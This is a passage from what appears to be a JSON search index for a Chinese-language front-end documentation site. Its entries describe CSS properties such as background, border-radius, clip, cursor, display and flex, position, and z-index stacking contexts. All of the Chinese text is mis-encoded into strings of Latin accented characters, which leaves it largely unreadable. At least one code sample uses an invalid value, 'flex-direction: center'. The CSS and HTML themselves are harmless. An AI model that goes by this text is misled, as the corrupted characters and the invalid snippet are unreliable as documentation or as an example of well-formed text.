å°†æŠŠèƒŒæ™¯é¢œè‰²è®¾ç½®ä¸ºçº¢è‰²ï¼ŒèƒŒæ™¯å›¾ç‰‡è®¾ç½®ä¸º\"image.jpg\"ï¼Œ å¹¶è®¾ç½®ä¸é‡å¤èƒŒæ™¯å›¾ç‰‡ï¼Œå¹¶å°†èƒŒæ™¯å›¾ç‰‡å±…ä¸­å¯¹é½ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background.html"},{"title":"background-color","text":"è®¾ç½®èƒŒæ™¯è‰², ä¸€èˆ¬åªè¦åœ¨æœ€å¤–å±‚è®¾ç½®äº†èƒŒæ™¯è‰², å†…éƒ¨æ²¡ç‰¹æ®Šç½®é¡¶ä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸ªè‰²äº†è²Œä¼¼","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html"},{"title":"background-image","text":"background-imageå±æ€§ç”¨äºå•ç‹¬è®¾ç½®å…ƒç´ çš„èƒŒæ™¯å›¾ç‰‡ã€‚ ä½ å¯ä»¥é€šè¿‡æŒ‡å®šä¸€ä¸ªURLå€¼æ¥è®¾ç½®èƒŒæ™¯å›¾ç‰‡ï¼Œä¾‹å¦‚: background-image: url(\"image.jpg\"); ä¸Šè¿°ä»£ç å°†æŠŠå…ƒç´ çš„èƒŒæ™¯å›¾ç‰‡è®¾ç½®ä¸º\"image.jpg\"ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html"},{"title":"border-radius","text":"è®¾ç½®å…ƒç´ çš„è¾¹æ¡†åœ†è§’æ•ˆæœ, ä½¿å…ƒç´ çš„è¾¹æ¡†è§’å˜å¾—åœ†æ»‘ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ç›´è§’ã€‚ border-radius å±æ€§å¯ä»¥åº”ç”¨äºå…ƒç´ çš„å››ä¸ªè§’ï¼Œä¹Ÿå¯ä»¥åº”ç”¨äºå•ä¸ªè§’ã€‚ å®ƒæ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªé•¿åº¦å€¼æˆ–ç™¾åˆ†æ¯”å€¼ä½œä¸ºå‚æ•°ï¼Œç”¨äºæŒ‡å®šåœ†è§’çš„åŠå¾„å¤§å°ã€‚ å¸¸è§ä½¿ç”¨æ–¹å¼å’Œæ•ˆæœï¼š è®¾ç½®ç»Ÿä¸€çš„åœ†è§’åŠå¾„, ä½¿ .element å…ƒç´ çš„å››ä¸ªè§’éƒ½å…·æœ‰ 10px çš„åœ†è§’: .element { border-radius: 10px; } è®¾ç½®æ°´å¹³å’Œå‚ç›´æ–¹å‘ä¸Šä¸åŒçš„åœ†è§’åŠå¾„, ä½¿ .element å…ƒç´ çš„å·¦ä¸Šè§’å’Œå³ä¸‹è§’åˆ†åˆ«å…·æœ‰ 10px å’Œ 20px çš„åœ†è§’ã€‚: .element { border-radius: 10px 20px; } è®¾ç½®å•ä¸ªè§’çš„åœ†è§’åŠå¾„, ä½¿ .element å…ƒç´ çš„å·¦ä¸Šè§’å…·æœ‰ 10px çš„åœ†è§’ï¼Œå³ä¸‹è§’å…·æœ‰ 20px çš„åœ†è§’ï¼Œè€Œå…¶ä½™ä¸¤ä¸ªè§’åˆ™ä¿æŒç›´è§’: .element { border-radius: 10px 0 0 20px; }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html"},{"title":"box-shadow","text":"ç»™å…ƒç´ æ·»åŠ é˜´å½±. é˜´å½±å¡«å……çš„ä½ç½®ä¸º /docs/å‰ç«¯/css/csså¸¸ç”¨å±æ€§/padding æ‰€å¤„ä½ç½®","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html"},{"title":"clip","text":"clip æ˜¯ä¸€ä¸ª CSS å±æ€§ï¼Œç”¨äºæŒ‡å®šå…ƒç´ çš„è£å‰ªåŒºåŸŸï¼Œå³ç¡®å®šå…ƒç´ åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„éƒ¨åˆ†ã€‚ å®ƒå¯ä»¥ç”¨æ¥éšè—å…ƒç´ çš„ä¸€éƒ¨åˆ†å†…å®¹æˆ–è€…åˆ›å»ºéçŸ©å½¢çš„å¯è§†åŒºåŸŸã€‚ clip å±æ€§éœ€è¦é…åˆ position: absolute; æˆ–è€… position: fixed; ä½¿ç”¨ ï¼Œ å› ä¸ºåªæœ‰ç»å¯¹å®šä½æˆ–å›ºå®šå®šä½çš„å…ƒç´ æ‰èƒ½è£å‰ªã€‚ clip å±æ€§å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼è¿›è¡Œè®¾ç½®ï¼š rect() ä½¿ç”¨ rect() å‡½æ•°: .element { position: absolute; clip: rect(top, right, bottom, left); } å…¶ä¸­ï¼Œtopã€rightã€bottom å’Œ left æ˜¯è£å‰ªåŒºåŸŸçš„è¾¹ç•Œå€¼ï¼Œå¯ä»¥ä½¿ç”¨åƒç´ ï¼ˆpxï¼‰æˆ–ç™¾åˆ†æ¯”ï¼ˆ%ï¼‰æ¥æŒ‡å®šã€‚ auto ä½¿ç”¨ auto å…³é”®å­—: .element { position: absolute; clip: auto; } å½“ä½¿ç”¨ clip: auto; æ—¶ï¼Œå…ƒç´ å°†ä¸ä¼šè¢«è£å‰ªï¼Œæ˜¾ç¤ºå®Œæ•´çš„å†…å®¹ã€‚ å½“ä½¿ç”¨ clip: rect(auto, auto, auto, auto); æ—¶ï¼Œå…ƒç´ å°†æ ¹æ®å…¶å®šä½å’Œå°ºå¯¸è¿›è¡Œè‡ªåŠ¨è£å‰ªã€‚ æ³¨è§£ clip å±æ€§åœ¨ CSS3 ä¸­å·²è¢«åºŸå¼ƒï¼Œä¸æ¨èä½¿ç”¨ã€‚ æ¨èä½¿ç”¨æ›´å¼ºå¤§å’Œçµæ´»çš„ clip-path å±æ€§æ¥å®ç°æ›´å¤æ‚çš„è£å‰ªæ•ˆæœã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html"},{"title":"color","text":"è®¾ç½®æ–‡å­—é¢œè‰²","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html"},{"title":"cursor","text":"cursor ç”¨äºæŒ‡å®šé¼ æ ‡æŒ‡é’ˆåœ¨å…ƒç´ ä¸Šçš„å¤–è§‚ã€‚ é€šè¿‡è®¾ç½® cursor å±æ€§ï¼Œä½ å¯ä»¥æ”¹å˜ç”¨æˆ·ä¸ç‰¹å®šå…ƒç´ äº¤äº’æ—¶é¼ æ ‡æŒ‡é’ˆçš„æ ·å¼ï¼Œä»¥æä¾›è§†è§‰åé¦ˆæˆ–æŒ‡ç¤ºå…ƒç´ çš„å¯æ“ä½œæ€§ã€‚ cursor å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š é¢„å®šä¹‰å…‰æ ‡ pointerï¼ˆæ‰‹å‹å…‰æ ‡ï¼Œè¡¨ç¤ºé“¾æ¥æˆ–å¯ç‚¹å‡»å…ƒç´ ï¼‰ defaultï¼ˆé»˜è®¤å…‰æ ‡ï¼‰ textï¼ˆæ–‡æœ¬è¾“å…¥å…‰æ ‡ï¼‰ç­‰ã€‚ CSS å…‰æ ‡å€¼ï¼ˆCursor valuesï¼‰ é€šè¿‡æŒ‡å®šä¸€ä¸ª URLï¼Œä½¿ç”¨è‡ªå®šä¹‰å›¾åƒä½œä¸ºå…‰æ ‡ã€‚ ä½¿ç”¨åä¸º \"cursor.png\" çš„å›¾åƒä½œä¸ºå…‰æ ‡ï¼Œ å¹¶è®¾ç½® auto ä½œä¸ºå›é€€å€¼ï¼ˆå¦‚æœå›¾åƒæ— æ³•åŠ è½½ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å…‰æ ‡ï¼‰: cursor: url(cursor.png), auto; ç³»ç»Ÿå…‰æ ‡: cursor å±æ€§è¿˜æ”¯æŒæŒ‡å®šç³»ç»Ÿå…‰æ ‡æ ·å¼ï¼Œå¦‚ crosshairï¼ˆåå­—çº¿ï¼‰ã€helpï¼ˆå¸®åŠ©å…‰æ ‡ï¼‰ã€moveï¼ˆç§»åŠ¨å…‰æ ‡ï¼‰ç­‰ã€‚ è¿™äº›æ ·å¼ä¼šæ ¹æ®æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨çš„ä¸åŒè€Œæœ‰æ‰€å˜åŒ–: cursor: crosshair;","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html"},{"title":"display","text":"è®¾ç½®å…ƒç´ æ˜¯å¦è¢«è§†ä¸ºå—æˆ–è€…å†…è”å…ƒç´ ä»¥åŠç”¨äºå­å…ƒç´ çš„å¸ƒå±€ï¼Œä¾‹å¦‚æµå¼å¸ƒå±€ã€ç½‘æ ¼å¸ƒå±€æˆ–å¼¹æ€§å¸ƒå±€; é»˜è®¤: inline none æ­¤å…ƒç´ ä¸ä¼šè¢«æ˜¾ç¤º block æ­¤å…ƒç´ å°†æ˜¾ç¤ºä¸ºå—çº§å…ƒç´ ï¼Œæ­¤å…ƒç´ å‰åä¼šå¸¦æœ‰æ¢è¡Œç¬¦ inline é»˜è®¤ã€‚æ­¤å…ƒç´ ä¼šè¢«æ˜¾ç¤ºä¸ºå†…è”å…ƒç´ ï¼Œå…ƒç´ å‰åæ²¡æœ‰æ¢è¡Œç¬¦ inline-block è¡Œå†…å—å…ƒç´ ã€‚ï¼ˆCSS2.1 æ–°å¢çš„å€¼ï¼‰ list-item æ­¤å…ƒç´ ä¼šä½œä¸ºåˆ—è¡¨æ˜¾ç¤º run-in æ­¤å…ƒç´ ä¼šæ ¹æ®ä¸Šä¸‹æ–‡ä½œä¸ºå—çº§å…ƒç´ æˆ–å†…è”å…ƒç´ æ˜¾ç¤º compact CSS ä¸­æœ‰å€¼ compactï¼Œä¸è¿‡ç”±äºç¼ºä¹å¹¿æ³›æ”¯æŒï¼Œå·²ç»ä» CSS2.1 ä¸­åˆ é™¤ marker CSS ä¸­æœ‰å€¼ markerï¼Œä¸è¿‡ç”±äºç¼ºä¹å¹¿æ³›æ”¯æŒï¼Œå·²ç»ä» CSS2.1 ä¸­åˆ é™¤ table æ­¤å…ƒç´ ä¼šä½œä¸ºå—çº§è¡¨æ ¼æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <table>ï¼‰ï¼Œè¡¨æ ¼å‰åå¸¦æœ‰æ¢è¡Œç¬¦ inline-table æ­¤å…ƒç´ ä¼šä½œä¸ºå†…è”è¡¨æ ¼æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <table>ï¼‰ï¼Œè¡¨æ ¼å‰åæ²¡æœ‰æ¢è¡Œç¬¦ table-row-group æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªæˆ–å¤šä¸ªè¡Œçš„åˆ†ç»„æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <tbody>ï¼‰ table-header-group æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªæˆ–å¤šä¸ªè¡Œçš„åˆ†ç»„æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <thead>ï¼‰ table-footer-group æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªæˆ–å¤šä¸ªè¡Œçš„åˆ†ç»„æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <tfoot>ï¼‰ flow-root ç”Ÿæˆä¸€ä¸ªå—çº§å…ƒç´ ç›’ï¼Œå…¶ä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„å—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œå®šä¹‰æ ¼å¼åŒ–ä¸Šä¸‹æ–‡çš„æ ¹å…ƒç´  table-row æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªè¡¨æ ¼è¡Œæ˜¾ç¤ºï¼ˆç±»ä¼¼ <tr>ï¼‰ table-column-group æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªæˆ–å¤šä¸ªåˆ—çš„åˆ†ç»„æ¥æ˜¾ç¤ºï¼ˆç±»ä¼¼ <colgroup>ï¼‰ table-column æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªå•å…ƒæ ¼åˆ—æ˜¾ç¤ºï¼ˆç±»ä¼¼ <col>ï¼‰ table-cell æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªè¡¨æ ¼å•å…ƒæ ¼æ˜¾ç¤ºï¼ˆç±»ä¼¼ <td> å’Œ <th>ï¼‰ table-caption æ­¤å…ƒç´ ä¼šä½œä¸ºä¸€ä¸ªè¡¨æ ¼æ ‡é¢˜æ˜¾ç¤ºï¼ˆç±»ä¼¼ <caption>ï¼‰ inherit è§„å®šåº”è¯¥ä»çˆ¶å…ƒç´ ç»§æ‰¿ display å±æ€§çš„å€¼ flex: Flexible Boxçš„ç¼©å†™ï¼Œæ„ä¸º\"å¼¹æ€§å¸ƒå±€\"ï¼Œç”¨æ¥ä¸ºç›’çŠ¶æ¨¡å‹æä¾›æœ€å¤§çš„çµæ´»æ€§ã€‚ è®¾ä¸ºFlexå¸ƒå±€ä»¥åï¼Œå­å…ƒç´ çš„floatã€clearå’Œvertical-alignå±æ€§å°†å¤±æ•ˆ å¯¹äº flex, è¿˜æœ‰ä»¥ä¸‹æ‹“å±•å±æ€§ flex-directionå®¹å™¨å†…å…ƒç´ çš„æ’åˆ—æ–¹å‘(é»˜è®¤æ¨ªå‘æ’åˆ—) flex-wrap å®¹å™¨å†…å…ƒç´ çš„æ¢è¡Œ(é»˜è®¤ä¸æ¢è¡Œ) justify-content å…ƒç´ åœ¨Xè½´ä¸Šçš„æ’åˆ—. æ”¯æŒçš„å€¼: flex-start: Flexé¡¹å‘è¡Œå¤´ç´§æŒ¨ç€å¡«å……ã€‚è¿™ä¸ªæ˜¯é»˜è®¤å€¼ã€‚ flex-end: Flexé¡¹å‘è¡Œå°¾ç´§æŒ¨ç€å¡«å……ã€‚ center: Flexé¡¹å±…ä¸­ç´§æŒ¨ç€å¡«å……ã€‚ space-between: Flexé¡¹å¹³åˆ†å‰©ä½™ç©ºé—´ã€‚ space-around: Flexé¡¹å¹³åˆ†å‰©ä½™ç©ºé—´,ç©ºé—´åœ¨Flexé¡¹ä¹‹é—´ã€‚ space-evenly: Flexé¡¹å¹³åˆ†å‰©ä½™ç©ºé—´,ç©ºé—´åœ¨Flexé¡¹åŠè¾¹ç¼˜ä¹‹é—´ã€‚ align-items å…ƒç´ åœ¨Yè½´æ–¹å‘ä¸Šçš„å¯¹é½æ–¹å¼ align-content åœ¨å¼¹æ€§å®¹å™¨å†…çš„å…ƒç´ æ²¡æœ‰å ç”¨äº¤å‰è½´ä¸Šæ‰€æœ‰å¯ç”¨çš„ç©ºé—´æ—¶å¯¹é½å®¹å™¨å†…çš„å„é¡¹ï¼ˆå‚ç›´ï¼‰ å¦‚ parent ä¸‹çš„å­å…ƒç´ ä¸Šä¸‹å·¦å³éƒ½å±…ä¸­: .parent { display: flex; justify-content: center; align-items: center; } æˆ–è€…: .parent { display: flex; flex-direction: center; place-content: center; // justify-content: center; align-items: center; width: 100%; height: 100%; }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html"},{"title":"font-weight","text":"å­—é‡, å¯ä»¥ç†è§£ä¸ºå­—ä½“ç²—ç»†ç¨‹åº¦, æ•°å€¼è¶Šé«˜è¡¨ç¤ºå­—ä½“è¶Šç²— æ•°å€¼èŒƒå›´ä» 100 åˆ°900ï¼Œå¢é‡ä¸º 100ã€‚ æ­£å¸¸ç²—ç»†çš„å€¼æ˜¯ 400ï¼Œè€Œ 700 çš„å€¼è¢«è®¤ä¸ºæ˜¯ç²—ä½“ã€‚ ä¸€äº›å¸¸ç”¨çš„å…³é”®å­—å€¼åŒ…æ‹¬ boldã€bolderã€lighter å’Œ normalã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html"},{"title":"margin","text":"å¤–è¾¹è· æ³¨è§£ å…ƒç´ å¤–è¾¹è·çš„é¢œè‰²æ˜¯ç”±çˆ¶ä»£å…ƒç´ çš„é¢œè‰²å†³å®š","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html"},{"title":"padding","text":"å†…è¾¹è·","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html"},{"title":"position","text":"è§„å®šå…ƒç´ çš„å®šä½ç±»å‹ static: HTML å…ƒç´ çš„é»˜è®¤å€¼ï¼Œå³æ²¡æœ‰å®šä½ï¼Œéµå¾ªæ­£å¸¸çš„æ–‡æ¡£æµå¯¹è±¡; é™æ€å®šä½çš„å…ƒç´ ä¸ä¼šå—åˆ° top, bottom, left, rightå½±å“; relative: ç›¸å¯¹ä½ç½®, å…ƒç´ çš„å®šä½æ˜¯ç›¸å¯¹å…¶æ­£å¸¸ä½ç½®; ç§»åŠ¨ç›¸å¯¹å®šä½å…ƒç´ ï¼Œä½†å®ƒåŸæœ¬æ‰€å çš„ç©ºé—´ä¸ä¼šæ”¹å˜; absolute: ç»å¯¹å®šä½çš„å…ƒç´ çš„ä½ç½®ç›¸å¯¹äºæœ€è¿‘çš„å·²å®šä½çˆ¶å…ƒç´ ; å¦‚æœå…ƒç´ æ²¡æœ‰å·²å®šä½çš„çˆ¶å…ƒç´ ï¼Œé‚£ä¹ˆå®ƒçš„ä½ç½®ç›¸å¯¹äº<html>; fixed: å…ƒç´ çš„ä½ç½®ç›¸å¯¹äºæµè§ˆå™¨çª—å£æ˜¯å›ºå®šä½ç½®; å³ä½¿çª—å£æ˜¯æ»šåŠ¨çš„å®ƒä¹Ÿä¸ä¼šç§»åŠ¨; sticky: è‹±æ–‡å­—é¢æ„æ€æ˜¯ç²˜ï¼Œç²˜è´´ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå®ƒç§°ä¹‹ä¸ºç²˜æ€§å®šä½; åŸºäºç”¨æˆ·çš„æ»šåŠ¨ä½ç½®æ¥å®šä½; ä¾èµ–äºç”¨æˆ·çš„æ»šåŠ¨ï¼Œåœ¨ position:relative ä¸ position:fixed å®šä½ä¹‹é—´åˆ‡æ¢; è¡Œä¸ºå°±åƒ position:relative; è€Œå½“é¡µé¢æ»šåŠ¨è¶…å‡ºç›®æ ‡åŒºåŸŸæ—¶ï¼Œå®ƒçš„è¡¨ç°å°±åƒ position:fixed;ï¼Œå®ƒä¼šå›ºå®šåœ¨ç›®æ ‡ä½ç½®; å…ƒç´ å®šä½è¡¨ç°ä¸ºåœ¨è·¨è¶Šç‰¹å®šé˜ˆå€¼å‰ä¸ºç›¸å¯¹å®šä½ï¼Œä¹‹åä¸ºå›ºå®šå®šä½; ç‰¹å®šé˜ˆå€¼æŒ‡çš„æ˜¯ top, right, bottom æˆ– left ä¹‹ä¸€ï¼Œæ¢è¨€ä¹‹ï¼ŒæŒ‡å®š top, right, bottom æˆ– left å››ä¸ªé˜ˆå€¼å…¶ä¸­ä¹‹ä¸€ï¼Œæ‰å¯ä½¿ç²˜æ€§å®šä½ç”Ÿæ•ˆã€‚å¦åˆ™å…¶è¡Œä¸ºä¸ç›¸å¯¹å®šä½ç›¸åŒ;","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html"},{"title":"text-align","text":"è®¾ç½® å…ƒç´ æ¡†å†…æ–‡æœ¬å†…å®¹ çš„æ°´å¹³å¯¹é½æ–¹å¼ text-align å±æ€§ç”¨äºè®¾ç½®æ–‡æœ¬å†…å®¹åœ¨å…ƒç´ æ¡†ä¸­çš„æ°´å¹³å¯¹é½æ–¹å¼ã€‚ å®ƒé€‚ç”¨äºå—çº§å…ƒç´ å’Œä¸€äº›å†…è”å…ƒç´ ã€‚ å¸¸è§çš„å€¼åŒ…æ‹¬ leftï¼ˆé»˜è®¤å€¼ï¼Œå·¦å¯¹é½ï¼‰ rightï¼ˆå³å¯¹é½ï¼‰ centerï¼ˆå±…ä¸­å¯¹é½ï¼‰ justifyï¼ˆä¸¤ç«¯å¯¹é½ï¼‰ ç­‰ã€‚è¯¥å±æ€§ä¸»è¦ç”¨äºè°ƒæ•´æ–‡æœ¬çš„å¯¹é½æ–¹å¼ï¼Œè€Œä¸æ˜¯å…ƒç´ æœ¬èº«ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html"},{"title":"å…ƒç´ çš„å‡ºåœºé¡ºåº(z-index)","text":"åŸæ–‡: https://zhuanlan.zhihu.com/p/340371083 åŸæ–‡æ˜¯è®²è§£ z-index ä½œç”¨çš„. å½“æ²¡æœ‰ z-index æ—¶ æ²¡æœ‰ä½¿ç”¨ z-index çš„æ—¶å€™ï¼Œå…ƒç´ çš„å±‚å å…³ç³»ç”±2ä¸ªå› ç´ å†³å®š å…ƒç´ çš„ position æ˜¯å¦æ˜¯ static : static æˆ– non-positioned : æ²¡æœ‰è®¾ç½® position , è¿™ä¸ªæ˜¯é»˜è®¤å€¼ positioned : position å€¼æ˜¯ relative , absolute , fixed , æˆ– sticky åˆ™ç§° positioned positioned å…ƒç´ äº«å—ç‰¹æƒï¼Œä¼šè¦†ç›– non-positioned `å…ƒç´ ; è€Œ `non-positioned å…ƒç´ ä¸­ï¼Œæœ‰ float æ ·å¼çš„å…ƒç´ è¦†ç›– æ²¡æœ‰float çš„ å…ƒç´ çš„\"å‡ºåœº\"é¡ºåº â€”â€” å³åœ¨ html ä¸­çš„é¡ºåºï¼ŒåŒç±»å‹å…ƒç´ éµå¾ª åæ¥è€…å±…ä¸Š çš„åŸåˆ™ non-positioned / static / æ— float å…ƒç´ ä¸€èˆ¬åœ¨æœ€ä¸‹é¢ å½“å­˜åœ¨ z-index z-index å­˜åœ¨çš„ä¸€ä¸ªèƒŒæ™¯æ˜¯ Stacking Context ï¼Œ ä¸­æ–‡å¸¸è¯‘ä½œå±‚å ä¸Šä¸‹æ–‡ ï¼ˆå…¶å®æ•°æ®ç»“æ„ä¸­çš„æ ˆçš„å•è¯ä¹Ÿæ˜¯ stackï¼Œæ‰€ä»¥å±‚å ä¸Šä¸‹æ–‡ä¸­å·²ç»è•´å«äº†åæ¥è€…å±…ä¸Šçš„æ„æ€ï¼‰ æ„å»ºå±‚å ä¸Šä¸‹æ–‡ä»¿ä½› ç›–æ¥¼: é¦–å…ˆï¼Œ <html> å…ƒç´ æ˜¯åœ°å¹³çº¿æˆ–åœ°åŸº â€”â€” æ‰€æœ‰æ¥¼éƒ½æ˜¯ä»åœ°åŸºå¼€å§‹ç›–çš„ æ¥ä¸‹æ¥ï¼Œæ¯äº§ç”Ÿä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ï¼Œç›¸å½“äºç›–ä¸€åº§æ¥¼ï¼Œ z-index çš„å€¼ç›¸å½“äºæ¥¼çš„é«˜åº¦ ä»¥ä¸‹å‡ ç§å…ƒç´ å¯ä»¥äº§ç”Ÿå±‚å ä¸Šä¸‹æ–‡ï¼Œä¸”z-indexçš„å€¼æ‰æœ‰æ•ˆ: å…ƒç´ çš„ position å€¼ä¸º absolute æˆ– relativeï¼Œ ä¸” z-index å€¼ä¸ä¸º auto ï¼ˆé»˜è®¤å€¼ï¼‰. å…ƒç´ çš„ position å€¼ä¸º fixed æˆ– sticky å…ƒç´ æ˜¯ flexbox å®¹å™¨çš„å­å…ƒç´ ï¼Œ ä¸” z-index å€¼ä¸ä¸º auto ï¼ˆé»˜è®¤å€¼ï¼‰ å…ƒç´ æ˜¯ grid å®¹å™¨çš„å­å…ƒç´ , ä¸” z-index å€¼ä¸ä¸º auto ï¼ˆé»˜è®¤å€¼ï¼‰ å…ƒç´ æœ‰ opacity å€¼ä¸”å€¼å°äº 1. å…ƒç´ æœ‰ä»¥ä¸‹ä»»æ„ä¸€é¡¹çš„å€¼ï¼Œä¸”å€¼ä¸ä¸º none transform filter perspective clip-path mask / mask-image / mask-border å…ƒç´ æœ‰ isolation å€¼ä¸”å€¼ä¸º isolate . å…ƒç´ æœ‰ mix-blend-mode å€¼ä¸”å€¼ä¸ä¸º normal . å…ƒç´ æœ‰ -webkit-overflow-scrolling å€¼ä¸”å€¼ä¸º touch . è¿˜æœ‰å°‘æ•°å‡ ç§å†·é—¨çš„æƒ…å†µ å±‚å ä¸Šä¸‹æ–‡æ˜¯å¯ä»¥åµŒå¥—çš„ â€”â€” è¿™æ˜¯æœ€å®¹æ˜“è®©äººè¯¯è§£çš„ä¸€å—. åµŒå¥—ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯åœ¨ä¸€ä¸ª å±‚å ä¸Šä¸‹æ–‡ ä¸­èƒ½åˆ›å»º å¦ä¸€ä¸ªå±‚å ä¸Šä¸‹æ–‡ã€‚ å‡å¦‚åœ¨åœ°åŸºä¸Šç›–ä¸€åº§50ç±³é«˜çš„æ¥¼ (å³ z-index: 50 ), æœ‰å¯èƒ½åœ¨æ¥¼é‡Œåˆç›–ä¸€æ ‹ 100ç±³é«˜çš„æ¥¼ä¸­æ¥¼å—ï¼Ÿå½“ç„¶ä¸å¯èƒ½ï¼ ä½†æ˜¯ä½ å¯ä»¥åœ¨è¿™åº§æ¥¼é‡Œå»ºä¸€åº§ 100 çº§é˜¶æ¢¯é«˜çš„å¤§å ‚ã€‚ æ¢å¥è¯è¯´ï¼Œåœ¨åµŒå¥—çš„å±‚å ä¸Šä¸‹æ–‡ä¸­ï¼Œ å­å±‚å ä¸Šä¸‹æ–‡è¢«é™åˆ¶åœ¨äº†çˆ¶å±‚å ä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒä»¬çš„ z-index \"å•ä½\"å·²ç»ä¸ä¸€æ ·äº†ï¼ˆz-index æ²¡æœ‰å•ä½ï¼Œè¿™è¾¹åªæ˜¯ç”¨äºç†è§£ï¼‰ï¼Œ æ— è®º å­å±‚å ä¸Šä¸‹æ–‡çš„ z-index å€¼æœ‰å¤šå¤§éƒ½æ— æ³•çªç ´çˆ¶å±‚å ä¸Šä¸‹æ–‡çš„é«˜åº¦ å±‚å ä¸Šä¸‹æ–‡å°ç»“: <html> å…ƒç´ çš„ç¬¬ä¸€çº§å±‚å ä¸Šä¸‹æ–‡ ç‰¹å®šæ ·å¼çš„å…ƒç´ å¯ä»¥äº§ç”Ÿæ–°çš„å±‚å ä¸Šä¸‹æ–‡ï¼Œä¸” z-index çš„å€¼åœ¨è¿™äº›å…ƒç´ ä¸­æ‰æœ‰æ•ˆ å­å±‚å ä¸Šä¸‹æ–‡çš„\"é«˜åº¦\"è¢«é™åˆ¶åœ¨äº†çˆ¶å±‚å ä¸Šä¸‹æ–‡ä¸­ åœ¨åŒçº§å±‚å ä¸Šä¸‹æ–‡ä¸­ï¼Œæ²¡æœ‰ï¼ˆæœ‰æ•ˆï¼‰ z-index çš„å…ƒç´ ä¾ç„¶éµå¾ªä¸Šä¸€å°èŠ‚çš„è§„å¾‹ï¼› z-index å€¼ç›¸åŒçš„å…ƒç´ éµå¾ªåæ¥è€…å±…ä¸ŠåŸåˆ™ æ³¨è§£ å±‚å ä¸Šä¸‹æ–‡åµŒå¥— ä¸ å…ƒç´ åµŒå¥— ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œ ä¸€ä¸ªå…ƒç´ æ‰€å¤„çš„çˆ¶å±‚å ä¸Šä¸‹æ–‡æ˜¯ç”±å†…å‘å¤–æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªèƒ½äº§ç”Ÿå±‚å ä¸Šä¸‹æ–‡çš„å…ƒç´ æ‰€äº§ç”Ÿçš„å±‚å ä¸Šä¸‹æ–‡ ä¾‹: <div id=\"div1\" style=\"position: relative; z-index: 1\"> <div id=\"div2\" style=\"position: relative; z-index: 1\"> æ‰€å¤„çš„çˆ¶å±‚å ä¸Šä¸‹æ–‡æ˜¯ div1 äº§ç”Ÿçš„å±‚å ä¸Šä¸‹æ–‡ </div> <div id=\"div3\"> <div id=\"div4\" style=\"position: relative; z-index: 